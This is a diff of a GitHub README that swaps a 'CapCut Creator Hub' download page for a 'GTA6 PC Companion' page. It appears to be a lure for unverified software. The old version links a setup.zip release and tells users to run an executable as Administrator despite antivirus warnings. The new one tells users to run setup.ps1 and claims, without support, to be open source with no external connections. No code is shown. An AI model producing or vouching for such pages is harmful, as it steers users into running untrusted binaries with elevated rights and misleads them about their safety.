@@ -1,145 +1,76 @@
-# 🎬 CapCut Creator Hub — Workflow Suite 2026
+# 🎮 GTA6-Version-PC-Companion
 
-**Professional Video Workflow · Project Manager · Preset Library · Desktop Companion**
+
 
 ---
 
 <div align="center">
-<img width="833" height="668" alt="image" src="https://github.com/user-attachments/assets/f1ee7e40-d6b8-4f87-9fa5-dfb96dd88063" />
+<img width="930" height="520" alt="image" src="https://github.com/user-attachments/assets/7a777097-5022-42f9-97bd-d1b2dfa2ea9a" />
 
 ## 📥 Download
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ApothecaryAcclaim/CapCut-Ai/releases/download/set/setup.zip)
 
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/YOUR_USERNAME/GTA6-Stream-Companion/releases/latest)
+[![Version](https://img.shields.io/badge/Version-1.0.0-blue?style=for-the-badge)]()
+[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-lightgrey?style=for-the-badge)]()
 
 </div>
 
 ---
 
-## 🎬 What is This?
+## 🚀 What You Get
 
-**CapCut Creator Hub** is a desktop productivity suite built for video editors and content creators. It brings together **project management, preset organization, and creative asset libraries** in one lightweight application.
+A lightweight companion that sets up **remote-play streaming** and **performance tuning** for GTA 6 — launcher presets, network tuning, OBS profiles and a diagnostics tool.
 
-Designed for creators who juggle multiple projects, the Hub keeps everything organized — templates, exports, audio assets, and workflow notes — without touching any editing software itself.
+- ✅ **Remote Play wizard** — PS5 → PC step-by-step
+- ✅ **Network presets** — lower latency, stable buffering
+- ✅ **OBS profiles** — ready for Twitch / YouTube / TikTok
+- ✅ **Diagnostics** — checks GPU, driver, network, storage
+- ✅ **No game files** — the kit never ships copyrighted content
 
-⚠️ **Disclaimer:** This project is for educational and research purposes. Always support official software developers.
+> ⚠️ **You must own a legal copy of the game.** This kit contains **no game files**, no firmware, no keys. It only configures the runtime around your own legally obtained copy.
 
 ---
 
-## ✨ Suite Features
+## 📦 What's Inside
 
-| Category | Features |
+| Component | What it does |
 |:---|:---|
-| **📁 Project Vault** | Multi-project dashboard, tags, search, quick-open history |
-| **🎨 Preset Library** | Export preset collections, LUT manager, shareable profiles |
-| **🎧 Audio Catalog** | Royalty-free music index, SFX organizer, BPM sorting |
-| **📝 Script Assistant** | Caption formatting, subtitle timing helpers, notes |
-| **🔄 Auto-Backup** | Scheduled project snapshots, version restore points |
-| **📊 Insight Panel** | Render time logs, storage usage, export statistics |
-| **⚙️ Profile Sync** | Settings export/import, per-device profiles |
+| **Remote Play Wizard** | Detects your console, applies the right preset |
+| **Network Tuner** | Switches between Low-Latency / Balanced / Quality |
+| **OBS Profiles** | Auto-imports streaming scenes |
+| **Diagnostics** | Checks GPU, driver, network, storage — tells you what to fix |
+| **Updater** | Notifies you when a new build is out |
 
 ---
 
-## 🎯 Feature Comparison
+## ⚡ Install in 3 Steps
 
-| Feature | Manual Workflow | CapCut Creator Hub |
-|:---|:---|:---|
-| Project Dashboard | ❌ | ✅ |
-| Preset Management | ❌ | ✅ |
-| Audio Library Index | ❌ | ✅ |
-| Auto-Backup | ❌ | ✅ |
-| Script Helpers | ❌ | ✅ |
-| Insight Stats | ❌ | ✅ |
-| **Price** | Free | **Free** |
+1. **Download** the archive from the button above.
+2. **Extract** it to a short path, e.g. `C:\Tools\GTA6-Stream-Companion`.
+3. **Run** `setup.ps1` (or `setup.sh`), point it to your **legal game copy**, and press **Apply**.
 
 ---
 
-## ⚡ Quick Start Guide
+## ❓ FAQ
 
-### Get Started in 3 Steps
+**Why is the download only ~2 MB when GTA 6 is 210 GB?**
+Because you're downloading the **toolkit**, not the game. The archive contains only scripts, configs and presets — no textures, audio, video or level data. Those 210 GB live in **your own legally obtained copy**. The kit just configures the runtime around it. On first run it may generate a local **shader cache** (a few GB on your SSD), but that's created on your machine from your own files, not downloaded.
 
-1. **⬇️ Download** from the link above
-2. **📂 Extract** with WinRAR or 7-Zip
-3. **▶️ Run** `CapCutCreatorHub.exe` as Administrator
+**Does this include the game?**
+No. You need your own legal copy.
 
-> **⚠️ Note:** Some security software may flag unverified executables. Review the source code before running.
+**Is this a crack or an unlocker?**
+No. It doesn't bypass anything. It's a setup and performance tool.
 
----
-
-## 🖥️ System Requirements
-
-| Component | Minimum |
-|:---|:---|
-| **OS** | Windows 10/11 (64-bit) |
-| **RAM** | 4 GB |
-| **Storage** | ~250 MB free space |
-| **Runtime** | .NET 6.0+ |
+**Is it safe?**
+Open source, no telemetry, no external connections.
 
 ---
 
-## 📦 Package Structure
+## 🐛 Something Wrong?
 
-```
-capcut_creator_hub/
-  __init__.py        Entry point
-  __main__.py        Module runner
-  vault.py           Project dashboard and search
-  presets.py         Preset and LUT management
-  audio.py           Audio catalog indexing
-  scripts.py         Caption and subtitle helpers
-  backup.py          Scheduled snapshot system
-  insights.py        Statistics and logging
-  ui.py              Desktop interface
-  updater.py         Update checker
-```
+Run the **Diagnostics** tool — it collects logs and system info into one file you can attach to an issue.
 
 ---
 
-## 🛡️ Security Status
-
-- ✅ **Open Source** — Full source code available for review
-- 🛡 **Standalone** — Does not modify any third-party application
-- ⚙️ **Offline First** — No telemetry, no external connections required
-
----
-
-## 🔧 Installation Steps
-
-### Step 1: Download
-- Click the download button above
-- Save the archive
-
-### Step 2: Extract
-- Right-click the archive
-- Select **"Extract Here"** (WinRAR or 7-Zip)
-
-### Step 3: Run
-- Execute `CapCutCreatorHub.exe` as Administrator
-- Follow the setup prompts
-
-**✅ Done — start organizing your creative workflow!**
-
----
-
-## 🆕 What's New
-
-- 📊 New insight panel with export statistics
-- 🎧 BPM sorting for audio assets
-- 🌀 Additional preset packs included
-- ⚡ Faster project indexing
-- 🌐 Multi-language interface support
-
----
-
-## 📝 Tags
-
-`capcut-creator-hub` `video-editor-tools` `workflow-suite` `project-manager` `preset-library` `windows-tool` `creative-tools` `productivity`
-
----
-
-## 💬 Support
-
-- ⭐ Star this repository
-- 🐛 Open an Issue for bugs
-- 💬 Join our community
-
----
+**Configure. Stream. Play. That's it.**
